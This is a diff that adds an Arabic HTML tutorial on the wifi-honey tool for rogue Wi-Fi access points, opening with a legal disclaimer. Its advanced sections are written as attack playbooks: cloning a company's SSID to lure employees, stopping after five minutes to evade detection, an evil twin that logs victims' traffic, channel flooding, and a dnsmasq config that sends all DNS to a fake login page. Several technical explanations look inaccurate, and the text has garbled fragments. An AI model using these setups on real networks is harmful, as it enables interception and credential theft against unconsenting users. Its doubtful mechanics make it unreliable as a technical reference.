@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل wifi-honey التقني للمبتدئين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(25, 25, 45, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        h2 {
+            color: #00d4ff;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+            margin: 30px 0 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        h2:hover {
+            color: #00ff88;
+            border-right-color: #00ff88;
+        }
+
+        h3 {
+            color: #ffaa00;
+            margin: 20px 0 10px 0;
+        }
+
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .section:hover {
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+        }
+
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-box::before {
+            content: "$ ";
+            color: #ffaa00;
+            font-weight: bold;
+        }
+
+        .example-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .technical-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        .option-table th {
+            background: #00d4ff;
+            color: #0d0d1a;
+            padding: 12px;
+            text-align: right;
+        }
+
+        .option-table td {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .option-table tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .button {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .expand-icon {
+            display: inline-block;
+            margin-left: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .expanded .expand-icon {
+            transform: rotate(90deg);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🍯 دليل wifi-honey التقني والتكتيكي</h1>
+        
+        <div class="warning-box" style="font-size: 1.2em; text-align: center;">
+            <strong>⚠️ تحذير قانوني وأخلاقي:</strong> هذه الأداة لإنشاء شبكات WiFi وهمية (honeypots) للاختبار المصرح به فقط. استخدامها لجمع بيانات أو خداع المستخدمين دون إذن صريح يعتبر جريمة في معظم الدول. هدف هذا الدليل التعليمي فقط.
+        </div>
+
+        <div class="section">
+            <h3>ما هو wifi-honey؟</h3>
+            <p><strong>wifi-honey</strong> هو سكريبت بسيط وفعال لإنشاء <strong>نقاط وصول WiFi وهمية (honeypots)</strong> باستخدام <code>hostapd</code> و<code>dnsmasq</code>. على عكس أدوات Evil Twin المتقدمة، wifi-honey يركز على إنشاء عشرات APs وهمية بأسماء متشابهة لجذب الأجهزة واختبار سلوكها.</p>
+        </div>
+
+        <h2 onclick="toggleSection('basics')">
+            <span class="expand-icon">▶</span> الأوامر الأساسية والمتطلبات
+        </h2>
+        <div id="basics" class="section hidden">
+            <div class="command-box">wifi-honey</div>
+            <p>تشغيل الوضع التفاعلي - يطلب منك إدخال اسم AP، قناة، واجهة الشبكة</p>
+            
+            <div class="command-box">wifi-honey FreeWiFi 6 wlan0mon</div>
+            <p>إنشاء 10 APs وهمية باسم "FreeWiFi" على القناة 6 باستخدام wlan0mon</p>
+            
+            <div class="command-box">wifi-honey "Company Guest" 1 wlan0mon eth0</div>
+            <p>إنشاء AP وهمي مع توصيل إنترنت حقيقي (bridge) لجذب الضحايا</p>
+            
+            <div class="technical-box">
+                <h4>🛠️ المتطلبات والتبعيات:</h4>
+                <p>wifi-honey يعتمد على:</p>
+                <ul style="margin: 10px 20px;">
+                    <li><strong>hostapd:</strong> لإنشاء نقاط الوصول (AP) الوهمية</li>
+                    <li><strong>dnsmasq:</strong> لتقديم DHCP وDNS للضحايا</li>
+                    <li><strong>airmon-ng:</strong> لوضع الواجهة في monitor mode</li>
+                    <li><strong>iptables:</strong> لإعادة توجيه حركة المرور</li>
+                </ul>
+                <p><strong>ملاحظة:</strong> wifi-honey لا يتعامل مع عمليات airmon-ng check kill تلقائيًا. يجب إيقاف NetworkManager يدويًا!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('interfaces')">
+            <span class="expand-icon">▶</span> إدارة الواجهات المزدوجة
+        </h2>
+        <div id="interfaces" class="section hidden">
+            <h3>🔌 الفرق بين واجهة AP وواجهة Network</h3>
+            
+            <div class="section">
+                <h4>ESSID (اسم الشبكة) - الحرب النفسية</h4>
+                <div class="command-box">wifi-honey "FREE High-Speed WiFi" 6 wlan0mon</div>
+                <p><strong>الآلية التقنية:</strong> يمرر الاسم إلى hostapd.conf كـ <code>ssid=FREE High-Speed WiFi</code>. يمكن استخدام أسطر ومسافات. الأجهزة تبحث عن شبكات سابقةconnect إليها، لذا استخدام أسماء شائعة يزيد معدل الاقتراع التلقائي.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 استراتيجيات التسمية:</h4>
+                    <ul>
+                        <li><strong>"Free WiFi":</strong> جذب عام</li>
+                        <li><strong>"Starbucks":</strong> يجذب عملاء Starbucks تلقائيًا</li>
+                        <li><strong>"iPhone 12":</strong> يجذب أجهزة تبحث عن hotspot شخصي</li>
+                        <li><strong>"Company_Guest":</strong> يجذب موظفين يبحثون عن شبكة الشركة</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Channel (القناة) - التكتيك الراديوي</h4>
+                <div class="command-box">wifi-honey FreeWiFi 1 wlan0mon</div>
+                <p><strong>القناة 1 (2.412 GHz):</strong> أقل ازدحامًا في المدن، لكن معظم الأجهزة تستخدم القنوات 6 و11.</p>
+                
+                <div class="command-box">wifi-honey FreeWiFi 11 wlan0mon</div>
+                <p><strong>القناة 11 (2.462 GHz):</strong> الأكثر شيوعًا. إنشاء 10 APs على نفس القناة يخلق تداخلًا (interference) يجبر الأجهزة على الاقتراع من جديد.</p>
+                
+                <div class="technical-box">
+                    <h4>📡 لماذا 10 APs على نفس القناة؟</h4>
+                    <p>wifi-honey يشغل 10 نسخ من hostapd على نفس الواجهة باستخدام:</p>
+                    <ul>
+                        <li><code>macaddr_acl=0</code> - يسمح بأي MAC للاتصال</li>
+                        <li><code>bss=wlan0mon_0</code> إلى <code>wlan0mon_9</code> - إنشاء 10 BSSID وهمية</li>
+                        <li>كل BSSID له MAC مختلف (MAC_AP + 1 إلى +10)</li>
+                    </ul>
+                    <p>هذا يجعل الأجهزة ترى 10 شبكات مختلفة بأسماء متطابقة، مما يخلق ارتباكًا!</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Interface (واجهة الشبكة) - المعضلة الأمنية</h4>
+                <div class="command-box">wifi-honey FreeWiFi 6 wlan0</div>
+                <p><strong>الخطأ الشائع:</strong> "wlan0 does not exist" - يعني أن الواجهة ليست في monitor mode أو أنها تُدار بواسطة NetworkManager.</p>
+                
+                <div class="warning-box">
+                    <h4>⚠️ الحل:</h4>
+                    <div class="command-box">sudo airmon-ng check kill</div>
+                    <p>يقتل NetworkManager وwpa_supplicant ثم يضع الواجهة في monitor mode.</p>
+                    
+                    <div class="command-box">sudo ip link set wlan0 up</div>
+                    <p>يجلب الواجهة لأعلى إذا كانت معطلة.</div>
+                </div>
+
+                <div class="technical-box">
+                    <h4>🔧 كيف يعمل wifi-honey مع الواجهة:</h4>
+                    <p>wifi-honey يستخدم <code>iwconfig</code> للتحقق من الواجهة. إذا كانت في managed mode، يحاول وضعها في monitor mode تلقائيًا باستخدام <code>iw dev wlan0 set type monitor</code>. لكن هذا يفشل عادةً لأن NetworkManager يعيدها فورًا.</p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('advanced')">
+            <span class="expand-icon">▶</span> الأوامر المتقدمة والسيناريوهات
+        </h2>
+        <div id="advanced" class="section hidden">
+            <div class="section">
+                <h4>🎯 The "Corporate Attack" (هجوم شبكة الشركة)</h4>
+                <div class="command-box">wifi-honey "Company_Secure_WiFi" 6 wlan0mon</div>
+                <p><strong>السيناريو:</strong> في مبنى الشركة، تخلق 10 APs باسم شبكة الشركة الحقيقية. الموظفون يحاولون الاتصال لأن أجهزتهم تتذكر الشبكة.</p>
+                
+                <div class="technical-box">
+                    <h4>🛡️ كيف يستغل هذا:</h4>
+                    <ul>
+                        <li><strong>Windows:</strong> يستخدم "Wireless Auto Configuration" للاتصال تلقائيًا بشبكات المفضلة إذا كانت القوة > -80 dBm</li>
+                        <li><strong>iOS/Android:</strong> تستخدم "Auto-Join" للشبكات المحفوظة</li>
+                        <li>كلاهما لا يتحققان من BSSID، فقط ESSID!</li>
+                    </ul>
+                </div>
+                
+                <div class="example-box">
+                    <strong>💡 التكتيك الناجح:</strong>
+                    <div class="command-box">wifi-honey "Company_Secure_WiFi" 6 wlan0mon && sleep 300 && pkill hostapd</div>
+                    <p>يعمل لمدة 5 دقائق فقط، يجمع محاولات الاتصال، ثم يتوقف لتجنب الاكتشاف.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>🥷 The "Evil Twin with Internet" (التوأم الشرير مع إنترنت)</h4>
+                <div class="command-box">wifi-honey "Free Airport WiFi" 11 wlan0mon eth0</div>
+                <p><strong>الآلية:</strong> يستخدم <code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code> لإعادة توجيه كل حركة المرور إلى eth0 (إنترنت حقيقي). يجعل الضحية يظن أنه على إنترنت حقيقي بينما تسجل كل حركته.</p>
+                
+                <div class="technical-box">
+                    <h4>🔍 كيف يعمل NAT:</h4>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+                    </pre>
+                    <p>هذا يجعل كل حزمة تحتفظ بـ IP المصدر الأصلي للضحية، لكن eth0 يرى فقط IP الموجه (your machine).</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>📡 The "Channel Flooding" (إغراق القنوات)</h4>
+                <div class="command-box">for i in 1 6 11; do wifi-honey "HOTSPOT_$i" $i wlan0mon & done</div>
+                <p><strong>السيناريو:</strong> تشغل 3 نسخ من wifi-honey على القنوات 1, 6, 11 مع أسماء مختلفة. يخلق إغراقًا كاملاً في نطاق 2.4 GHz.</p>
+                
+                <div class="technical-box">
+                    <h4>⚡ التأثير على الأجهزة:</h4>
+                    <ul>
+                        <li><strong>STA (Station):</strong> يرى 30 شبكة (10 على كل قناة)، يستهلك وقت CPU في فحص كل BSSID</li>
+                        <li><strong>AP الحقيقي:</strong> يواجه تداخلًا (interference) مما يقلل معدل البيانات (data rate)</li>
+                        <li><strong>Throughput:</strong> قد ينخفض بنسبة 30-50% بسبب تكرار الإرسال (retransmissions)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>🎣 The "Credential Harvester" (جمع بيانات الاعتماد)</h4>
+                <div class="command-box">wifi-honey "Facebook WiFi" 6 wlan0mon && dnsmasq -C dnsmasq.conf</div>
+                <p><strong>الآلية:</strong> تستخدم dnsmasq لإعادة توجيه كل DNS إلى IP الخاص بك. تخدم صفحة تسجيل مزيفة عندما يفتح المتصفح أول URL.</p>
+                
+                <div class="technical-box">
+                    <h4>📝 ملف dnsmasq.conf النموذجي:</h4>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+interface=wlan0mon
+dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,24h
+address=/#/192.168.1.1
+server=8.8.8.8
+log-queries
+                    </pre>
+                    <p><code>address=/#/192.168.1.1</code> يعيد توجيه كل طلب DNS (حتى non-existent domains) إلى خادمك. هذا يجعل كل URL يفتح صفحتك المزيفة.</p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('troubleshoot')">
+            <span class="expand-icon">▶</span> استكشاف الأخطاء وإصلاحها
+        </h2>
+        <div id="troubleshoot" class="section hidden">
+            <div class="section">
+                <h4>❌ Error: "wlan0 does not exist"</h4>
+                <p><strong>السبب:</strong> الواجهة غير موجودة أو NetworkManager يتحكم فيها.</p>
+                <div class="command-box">sudo airmon-ng check kill</div>
+                <div class="command-box">sudo ip link set wlan0 up</div>
+                <div class="command-box">sudo iw dev wlan0 set type monitor</div>
+            </div>
+
+            <div class="section">
+                <h4>❌ Error: "hostapd failed to start"</h4>
+                <p><strong>السبب:</strong> hostapd لا يدعم monitor mode مباشرة أو هناك مشكلة في الإعدادات.</p>
+                <div class="command-box">sudo airmon-ng start wlan0</div>
+                <p>هذا يخلق واجهة <code>wlan0mon</code> تلقائيًا.</div>
+            </div>
+
+            <div class="section">
+                <h4>❌ Error: "dnsmasq: failed to bind"</h4>
+                <p><strong>السبب:</strong> dnsmasq يعمل بالفعل أو هناك خدمة DHCP أخرى.</p>
+                <div class="command-box">sudo pkill dnsmasq</div>
+                <div class="command-box">sudo systemctl stop systemd-resolved</div>
+            </div>
+
+            <div class="section">
+                <h4>❌ Error: "Cannot assign requested address"</h4>
+                <p><strong>السبب:</strong> MAC address conflict أو الواجهة غير نشطة.</p>
+                <div class="command-box">sudo ip link set wlan0mon address 00:11:22:33:44:55</div>
+                <p>يغير MAC address لتجنب التعارض مع APs الحقيقية.</div>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="button" onclick="showAllSections()">إظهار كل الأقسام</button>
+            <button class="button" onclick="hideAllSections()">إخفاء كل الأقسام</button>
+        </div>
+    </div>
+
+    <script>
+        function toggleSection(id) {
+            const section = document.getElementById(id);
+            const header = section.previousElementSibling;
+            
+            section.classList.toggle('hidden');
+            header.classList.toggle('expanded');
+        }
+
+        function showAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.remove('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.add('expanded'));
+        }
+
+        function hideAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.remove('expanded'));
+        }
+
+        document.querySelectorAll('.command-box').forEach(box => {
+            box.addEventListener('click', function() {
+                const text = this.textContent.replace('$ ', '');
+                navigator.clipboard.writeText(text).then(() => {
+                    this.style.background = '#00ff88';
+                    this.style.color = '#0d0d1a';
+                    setTimeout(() => {
+                        this.style.background = '#0d0d1a';
+                        this.style.color = '#00ff88';
+                    }, 500);
+                });
+            });
+        });
+
+        window.addEventListener('load', () => {
+            document.getElementById('basics').classList.remove('hidden');
+            document.querySelector('h2[onclick*="basics"]').classList.add('expanded');
+        });
+    </script>
+</body>
+</html>
